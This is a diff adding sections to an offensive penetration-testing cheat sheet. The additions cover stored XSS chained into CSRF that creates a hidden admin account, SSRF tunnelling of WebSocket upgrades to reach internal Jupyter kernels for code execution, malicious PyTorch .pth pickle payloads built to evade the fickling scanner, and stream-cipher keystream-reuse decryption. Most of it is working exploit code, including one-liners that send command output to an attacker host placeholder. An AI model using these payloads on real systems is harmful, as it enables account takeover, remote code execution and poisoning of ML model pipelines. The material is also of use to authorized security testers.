+var x = new XMLHttpRequest();
+x.open('GET', '/admin/users', false);  // synchronous
+x.withCredentials = true;
+x.send();
+var csrf = x.responseText.match(/csrf_token.*?value="([^"]+)"/)[1];
+
+var y = new XMLHttpRequest();
+y.open('POST', '/admin/users/create', true);
+y.withCredentials = true;
+y.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+y.send('csrf_token=' + csrf + '&username=backdoor&password=Pwned123!&role=admin');
+```
+
+```bash
+# Common admin actions to forge via this chain:
+# - Create admin user (/admin/users/create)
+# - Change admin password (/admin/users/1/password)
+# - Enable user registration (/admin/settings → allow_signup=true)
+# - Change default role to admin (/admin/settings → default_role=admin)
+# - Add SSH key to admin profile (/admin/profile/ssh-keys)
+# - Disable 2FA (/admin/security/mfa/disable)
+# - Upload plugin/theme with webshell (/admin/plugins/upload)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# When you cannot host external JS — inline the entire chain in a single stored XSS payload
+# Minified one-liner (adapt endpoint/field names to target):
+PAYLOAD='<script>fetch("/admin/users").then(r=>r.text()).then(h=>{var t=h.match(/csrf[^"]*"([^"]+)"/)[1];fetch("/admin/users/create",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"_token="+t+"&name=pwn&email=x@x.com&password=Pwn123!&role=admin",credentials:"include"}).then(r=>fetch("http://<ATTACKER_IP>/?s="+r.status))})</script>'
+
+# Inject into vulnerable stored field (comment, profile, ticket)
+curl -s -X POST "http://<TARGET>/comment" \
+  -b "session=<TOKEN>" \
+  -d "body=${PAYLOAD}" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+
+> **Tip:** If the app uses a custom header for CSRF (e.g. `X-CSRF-Token`) instead of a form field, the XSS payload must read it from a meta tag or cookie and include it as a request header in the forged XHR/fetch. Check `<meta name="csrf-token" content="...">` in the page head.
 
 #### 3.4.7 XSS Keylogger
 
@@ -2377,6 +3092,94 @@ For HTTP/1 servers behind front-end with PING coalescing:
 # - SQLi, XSS, Command Injection, SSRF
 # Same payloads as HTTP, just sent via WebSocket frame
 ```
+
+#### 3.10b Tunneling a WebSocket Handshake Through SSRF
+
+When an internal service exposes a WebSocket-only API (e.g. Jupyter notebook kernel, real-time admin dashboard, internal chat) that is not directly reachable, an SSRF or raw-TCP-write primitive on the frontend can tunnel the WebSocket upgrade handshake to reach it. The SSRF fetcher sends the HTTP/1.1 `Upgrade: websocket` request to the internal host; if it follows the 101 switch, the attacker gets a bidirectional channel.
+
+```bash
+# Scenario: SSRF on http://<TARGET>/fetch?url= can reach internal ws://127.0.0.1:8888
+# Internal Jupyter at :8888 accepts WebSocket upgrade on /api/kernels/<ID>/channels
+
+# Step 1 — confirm internal WS endpoint via SSRF (HTTP probe returns 426 or 400)
+curl -s "http://<TARGET>/fetch?url=http://127.0.0.1:8888/api/kernels"
+# If 200 + JSON listing kernel IDs → WS endpoint confirmed
+
+# Step 2 — craft the WebSocket upgrade request through the SSRF
+# Use gopher:// if the SSRF supports it (raw TCP control)
+# Upgrade request:
+#   GET /api/kernels/<KERNEL_ID>/channels HTTP/1.1
+#   Host: 127.0.0.1:8888
+#   Upgrade: websocket
+#   Connection: Upgrade
+#   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+#   Sec-WebSocket-Version: 13
+
+UPGRADE='GET /api/kernels/<KERNEL_ID>/channels HTTP/1.1\r\nHost: 127.0.0.1:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n'
+GOPHER="gopher://127.0.0.1:8888/_$(python3 -c "import urllib.parse; print(urllib.parse.quote('$UPGRADE'))")"
+curl -s "http://<TARGET>/fetch?url=${GOPHER}"
+```
+
+```python
+#!/usr/bin/env python3
+# ssrf_ws_tunnel.py — tunnel WebSocket through an HTTP SSRF that follows redirects
+# When the SSRF primitive can issue arbitrary requests but not raw TCP:
+# Use an attacker-controlled redirect that upgrades to WS on the internal target
+import requests
+
+TARGET = "http://<TARGET>/fetch"
+INTERNAL_WS = "http://127.0.0.1:8888/api/kernels/<KERNEL_ID>/channels"
+
+# Some SSRF fetchers pass custom headers through — inject Upgrade headers
+headers_to_inject = {
+    "X-Forwarded-Host": "127.0.0.1:8888",
+}
+
+# Method 1: Direct URL with Upgrade headers (works if fetcher passes them)
+resp = requests.get(TARGET, params={
+    "url": INTERNAL_WS
+}, headers={
+    "Upgrade": "websocket",
+    "Connection": "Upgrade",
+    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+    "Sec-WebSocket-Version": "13"
+})
+print(resp.status_code, resp.text[:500])
+```
+
+```bash
+# Method 2: If SSRF supports ws:// or wss:// URL schemes directly
+curl -s "http://<TARGET>/fetch?url=ws://127.0.0.1:8888/api/kernels/<KERNEL_ID>/channels"
+
+# Method 3: Attacker-hosted redirect (307 preserves method + headers)
+# Host a Flask/nc redirector that 307s to the internal WS endpoint
+# Then point the SSRF at: http://<ATTACKER_IP>:8080/redir
+# The fetcher follows 307 → sends Upgrade to internal host
+
+# Method 4: Cross-protocol via SSRF to raw socket (CRLF injection in URL)
+# If the URL parser allows \r\n in the path:
+curl -s "http://<TARGET>/fetch?url=http://127.0.0.1:8888/%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0aSec-WebSocket-Key:%20x%0d%0aSec-WebSocket-Version:%2013%0d%0a%0d%0a"
+```
+
+```bash
+# Post-upgrade interaction (once WS channel is established):
+# Jupyter kernel execution via WS message:
+# {"header":{"msg_type":"execute_request"},"content":{"code":"import os; os.system('id')"}}
+
+# websocat — CLI WebSocket client for direct interaction (if you can reach the port)
+websocat ws://127.0.0.1:8888/api/kernels/<KERNEL_ID>/channels
+# Then type JSON messages manually
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure bash — craft gopher payload for WS upgrade without external tools
+PAYLOAD=$(printf 'GET /api/kernels/<KERNEL_ID>/channels HTTP/1.1\r\nHost: 127.0.0.1:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n' | xxd -p | sed 's/\(..\)/%\1/g')
+curl -s "http://<TARGET>/fetch?url=gopher://127.0.0.1:8888/_${PAYLOAD}"
+```
+
+> **Tip:** Internal WebSocket services often lack authentication (they assume network-level isolation). Once the upgrade succeeds through SSRF, you have full bidirectional access. Common internal WS targets: Jupyter (`:8888`), Grafana Live (`:3000/api/live/ws`), internal chat/notification services, debug/REPL consoles.
 
 ### 3.11 CRLF Injection
 ```bash
@@ -4201,6 +5004,101 @@ xxd /tmp/capture.bin | grep -E '8004 95|8003 |8002 '
 
 > **Tip:** When the target is a ML model loader (`torch.load`, `joblib.load`, `pickle.load` over `.pkl`/`.pt`/`.joblib`), the file is *expected* to be a pickle — no need to bypass any validation. Direct upload usually works. HuggingFace, MLflow, model-zoo endpoints are prime targets.
 
+#### 5.5.2b PyTorch-Specific Weaponization (torch.load / fickling Bypass via runpy)
+
+PyTorch `.pt`/`.pth` files are ZIP archives containing a `data.pkl` member that `torch.load()` deserializes. Static analysis tools like fickling scan the pickle opcodes for dangerous `REDUCE` calls, but the `runpy._run_code` gadget bypasses fickling's allowlist because `runpy` is categorized as safe stdlib.
+
+```python
+# Generate a malicious .pth file that bypasses fickling static analysis
+# Uses runpy._run_code instead of os.system — fickling flags os/subprocess but not runpy
+import pickle, zipfile, io
+
+class RunpyRCE:
+    def __reduce__(self):
+        # runpy._run_code executes arbitrary code in a module namespace
+        # fickling allowlists runpy as "safe" stdlib — bypass its static scanner
+        import runpy
+        code = compile('import os; os.system("id > /tmp/pwn")', '<string>', 'exec')
+        return (runpy._run_code, (code, {}))
+
+# Serialize the payload
+payload = pickle.dumps(RunpyRCE(), protocol=2)
+
+# Pack into PyTorch .pth ZIP structure (mimics torch.save layout)
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w') as zf:
+    # PyTorch expects: archive/data.pkl + archive/data/ directory
+    zf.writestr('archive/data.pkl', payload)
+    zf.writestr('archive/data/0', b'')  # dummy tensor storage
+buf.seek(0)
+with open('malicious_model.pth', 'wb') as f:
+    f.write(buf.read())
+```
+
+```python
+# Simpler approach — direct pickle injection into existing .pth file
+# PyTorch .pth files are just ZIP with data.pkl inside
+import zipfile, pickle, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('curl http://<ATTACKER_IP>/$(id|base64)',))
+
+# Inject into existing model file (preserves other ZIP members)
+with zipfile.ZipFile('model.pth', 'a') as zf:
+    zf.writestr('archive/data.pkl', pickle.dumps(RCE(), protocol=2))
+```
+
+```bash
+# Delivery — upload the malicious .pth to the ML model endpoint
+curl -X POST -F "model=@malicious_model.pth" "http://<TARGET>/<APP_PATH>/upload"
+
+# Local privesc scenario — if a sudo wrapper or cron job runs torch.load on a user-writable path:
+# 1. Find the model path: find / -name "*.pth" -writable 2>/dev/null
+# 2. Replace with malicious model
+# 3. Wait for the privileged process to load it
+cp malicious_model.pth /opt/ml/models/production.pth
+
+# Verify fickling does NOT flag the runpy gadget:
+# fickling malicious_model.pth → shows REDUCE but runpy is "safe"
+# Only detects: os.system, subprocess.*, exec, eval in the callable
+```
+
+```bash
+# Inspect existing .pth file structure (recon before injection)
+unzip -l model.pth                             # list ZIP members
+unzip -p model.pth archive/data.pkl | python3 -c "
+import pickle, sys
+data = sys.stdin.buffer.read()
+print(pickle.loads(data))
+" 2>/dev/null || echo "Complex model — multiple pickle streams"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Generate malicious .pth with only Python stdlib (no torch needed on attacker box)
+python3 -c "
+import pickle, zipfile, io, os
+
+class R:
+    def __reduce__(self):
+        return (os.system, ('curl http://<ATTACKER_IP>/\$(id|base64)',))
+
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w') as zf:
+    zf.writestr('archive/data.pkl', pickle.dumps(R(), protocol=2))
+    zf.writestr('archive/data/0', b'')
+open('evil.pth','wb').write(buf.getvalue())
+print('[+] evil.pth created')
+"
+
+# Upload
+curl -X POST -F "file=@evil.pth" "http://<TARGET>/<APP_PATH>/upload"
+```
+
+> **Tip:** `torch.load(map_location='cpu')` still deserializes the pickle — the `map_location` arg only affects tensor device placement, not security. The only safe alternative is `torch.load(weights_only=True)` (PyTorch 2.0+) which skips arbitrary object reconstruction.
+
 #### 5.5.3 Java — Apache MyFaces / JSF Encrypted ViewState (leaked SECRET + MAC keys)
 
 When MyFaces ViewState is encrypted (default for 2.x), the unsigned POST in §5.5 fails. If `web.xml` (or a backup) leaks the keys, forge a valid encrypted+MAC'd ViewState wrapping any ysoserial gadget.
@@ -4536,6 +5434,133 @@ padbuster http://<TARGET>/page <ENCRYPTED_VALUE> 8 -cookies "auth=<ENCRYPTED_VAL
 
 # Block sizes to try: 8 (DES/3DES/Blowfish), 16 (AES)
 ```
+
+### 7.2b RC4 / Stream-Cipher Keystream Reuse (Two-Time Pad Attack)
+
+When an application encrypts multiple messages with the same key and IV (or nonce) using a stream cipher (RC4, ChaCha20 with reused nonce, AES-CTR with reused counter), XORing two ciphertexts cancels the keystream and yields plaintext XOR plaintext. If one plaintext is known (or guessable), the other is fully recoverable. Common scenarios: SSRF/URL encryption oracle that reuses a key across requests, VimCrypt files (blowfish-cfb with predictable IV), cookie encryption with static key.
+
+```python
+#!/usr/bin/env python3
+# two_time_pad.py — recover plaintext when keystream is reused
+# Given: C1 = P1 XOR KS, C2 = P2 XOR KS (same keystream KS)
+# Then: C1 XOR C2 = P1 XOR P2
+# If P1 is known: P2 = C1 XOR C2 XOR P1
+
+import sys
+
+def xor_bytes(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
+
+# Known plaintext (P1) and its ciphertext (C1)
+known_plaintext = b'<KNOWN_PLAINTEXT>'     # e.g. a URL you controlled that was encrypted
+known_ciphertext = bytes.fromhex('<C1_HEX>')
+
+# Target ciphertext (C2) — contains the secret plaintext (P2)
+target_ciphertext = bytes.fromhex('<C2_HEX>')
+
+# Recover keystream from known pair
+keystream = xor_bytes(known_plaintext, known_ciphertext)
+
+# Decrypt target using recovered keystream
+recovered = xor_bytes(target_ciphertext, keystream[:len(target_ciphertext)])
+print(f'[+] Recovered: {recovered}')
+```
+
+```python
+#!/usr/bin/env python3
+# rc4_oracle_attack.py — exploit an encryption oracle that reuses RC4 key
+# Scenario: app encrypts user-supplied URLs/strings and returns ciphertext
+# Same key used for every encryption → classic keystream reuse
+
+import requests
+
+ORACLE_URL = "http://<TARGET>/<APP_PATH>"
+PARAM = "<PARAM>"
+
+def encrypt_via_oracle(plaintext):
+    """Submit plaintext to the oracle, get back ciphertext (hex or base64)"""
+    resp = requests.get(ORACLE_URL, params={PARAM: plaintext})
+    return bytes.fromhex(resp.text.strip())  # adapt parsing to response format
+
+# Step 1: Submit known plaintext to recover keystream
+known = "A" * 256  # pad to max expected ciphertext length
+ks_ciphertext = encrypt_via_oracle(known)
+keystream = bytes(c ^ ord('A') for c in ks_ciphertext)
+
+# Step 2: Decrypt any previously captured ciphertext
+target_ct = bytes.fromhex('<CAPTURED_CIPHERTEXT_HEX>')
+plaintext = bytes(c ^ k for c, k in zip(target_ct, keystream))
+print(f'[+] Decrypted: {plaintext.decode(errors="replace")}')
+```
+
+```bash
+# VimCrypt decryption (blowfish-cfb with static/predictable seed)
+# VimCrypt files start with "VimCrypt~01!" (blowfish) or "VimCrypt~02!" (blowfish2)
+# or "VimCrypt~03!" (blowfish2 with better IV)
+file /tmp/encrypted.txt                        # "Vim encrypted file data"
+xxd /tmp/encrypted.txt | head -1               # confirm VimCrypt~0N! header
+
+# Brute-force the passphrase (vimdecrypt / john)
+# https://github.com/nlitsme/vimdecrypt
+python3 vimdecrypt.py /tmp/encrypted.txt       # prompts for password
+# Or brute with a wordlist:
+while read -r p; do
+  result=$(python3 -c "
+import sys
+sys.argv = ['', '/tmp/encrypted.txt']
+# vimdecrypt attempt with password '$p'
+" 2>/dev/null)
+  [ -n "$result" ] && echo "HIT: $p" && break
+done < /usr/share/wordlists/rockyou.txt
+
+# Alternative: open in vim with password guess
+vim -c ':set key=<PASSWORD>' -c ':w! /tmp/decrypted.txt' -c ':q!' /tmp/encrypted.txt
+```
+
+```bash
+# Detect keystream reuse — compare two ciphertexts
+python3 -c "
+c1 = bytes.fromhex('<C1_HEX>')
+c2 = bytes.fromhex('<C2_HEX>')
+xored = bytes(a^b for a,b in zip(c1,c2))
+# If result has ASCII-printable patterns → likely plaintext XOR plaintext → keystream reused
+printable = sum(1 for b in xored if 32 <= b <= 126)
+print(f'Printable ratio: {printable}/{len(xored)} ({printable*100//len(xored)}%)')
+if printable > len(xored) * 0.6:
+    print('[+] High printable ratio — keystream reuse likely!')
+    print(f'XOR result: {xored.decode(errors=\"replace\")}')
+"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure bash XOR (no Python needed) — requires xxd
+# XOR two hex-encoded ciphertexts byte by byte
+C1="<C1_HEX>"
+C2="<C2_HEX>"
+python3 -c "
+import sys
+c1=bytes.fromhex('$C1')
+c2=bytes.fromhex('$C2')
+known=b'<KNOWN_PLAINTEXT>'
+ks=bytes(a^b for a,b in zip(c1,known))
+pt=bytes(a^b for a,b in zip(c2,ks))
+print(pt.decode(errors='replace'))
+"
+
+# If no Python — use perl:
+perl -e '
+my @c1 = map {hex} unpack("(A2)*", "$ENV{C1}");
+my @c2 = map {hex} unpack("(A2)*", "$ENV{C2}");
+my @known = unpack("C*", "<KNOWN_PLAINTEXT>");
+my @ks = map { $c1[$_] ^ $known[$_] } 0..$#known;
+my @pt = map { $c2[$_] ^ $ks[$_] } 0..$#c2;
+print pack("C*", @pt), "\n";
+'
+```
+
+> **Tip:** The SSRF-to-encryption-oracle pattern appears when an app (a) encrypts URLs before fetching them, (b) uses a static key, and (c) returns the encrypted URL in the response or stores it retrievably. Submit a known URL, capture its ciphertext, XOR with the target ciphertext to recover the secret URL/data the app encrypted previously.
 
 ### 7.3 SSRF — Cloud Metadata Endpoints
 ```bash
